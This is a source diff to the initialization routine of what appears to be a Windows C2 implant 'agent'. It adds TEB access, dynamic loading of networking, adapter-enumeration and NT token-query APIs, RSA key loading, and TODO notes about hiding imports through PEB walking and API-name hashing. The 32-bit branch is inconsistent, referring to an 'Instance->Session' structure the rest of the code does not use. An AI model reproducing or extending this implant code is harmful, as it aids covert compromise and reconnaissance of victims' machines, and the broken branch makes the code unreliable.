@@ -3,10 +3,39 @@
 #include "agent.h"
 #include "localcstd.h"
 #include "Helpers.h"
+#include "token.h"
 
 INT init_agent(pAgent agent) {
 
     INT ERR;
+    PCONTEXT Context = (PCONTEXT)LocalAlloc(LPTR, sizeof(CONTEXT));
+    if (Context == NULL) {
+		return -1;
+	}
+    agent->Context = Context;
+
+#ifdef _WIN64
+    agent->pTeb = (void*)__readgsqword(0x30);
+#else
+    agent->pTeb = (void*)__readfsdword(0x18);
+#endif
+
+
+#if _WIN64
+    agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
+    agent->Context->Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
+#else
+    Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
+    Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_UNKNOWN;
+    if (ProcessIsWow(NtCurrentProcess())) {
+        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
+    }
+    else {
+        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_INTEL;
+    }
+#endif
+
+    //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.
 
     agent->hAdvapi32 = LoadLibraryA("advapi32.dll");
     if(agent->hAdvapi32 == NULL){
@@ -20,9 +49,19 @@ INT init_agent(pAgent agent) {
     if (agent->hWinHttp == NULL) {
         return -1;
     }
+    agent->hWs2_32 = LoadLibraryA("ws2_32.dll");
+    if (agent->hWs2_32 == NULL) {
+		return -1;
+	}
+    agent->hIphlpapi = LoadLibraryA("iphlpapi.dll");
+    if(agent->hIphlpapi == NULL) {
+        return -1;
+    }
 
+    
 
     //obtain winhttp apis
+    //NEEDS TO be resolved using a hash of the function name.
     agent->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)GetProcAddress(agent->hWinHttp, "WinHttpAddRequestHeaders");
     agent->pWinHttpConnect = (t_WinHttpConnect)GetProcAddress(agent->hWinHttp, "WinHttpConnect");
     agent->pWinHttpOpen = (t_WinHttpOpen)GetProcAddress(agent->hWinHttp, "WinHttpOpen");
@@ -34,6 +73,10 @@ INT init_agent(pAgent agent) {
 
     //obtain ntdll apis
     agent->pRtlGetVersion = (t_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
+    agent->pNtClose = (t_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
+    agent->pNtOpenProcessToken = (t_NtOpenProcessToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
+    agent->pNtOpenThreadToken = (t_NtOpenThreadToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThreadToken");
+    agent->pNtQueryInformationToken = (t_NtQueryInformationToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationToken");
 
     //obtain kernel32 apis
     agent->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");
@@ -44,6 +87,13 @@ INT init_agent(pAgent agent) {
     //obtain advapi32 apis
     agent->pGetUserNameA = (t_GetUserNameA)GetProcAddress(agent->hAdvapi32, "GetUserNameA");
 
+    //obtain ws2_32 apis
+    agent->pInetNtop = (t_inet_ntop)GetProcAddress(agent->hWs2_32, "inet_ntop");
+    agent->pWSAStartup = (t_WSAStartup)GetProcAddress(agent->hWs2_32, "WSAStartup");
+    agent->pWSACleanup = (t_WSACleanup)GetProcAddress(agent->hWs2_32, "WSACleanup");
+
+	//obtain iphlpapi apis
+	agent->pGetAdaptersAddresses = (t_GetAdaptersAddresses)GetProcAddress(agent->hIphlpapi, "GetAdaptersAddresses");
 
     //read rsa public key in der format from file.
     unsigned char* RsaPublicKeyDerBytes;
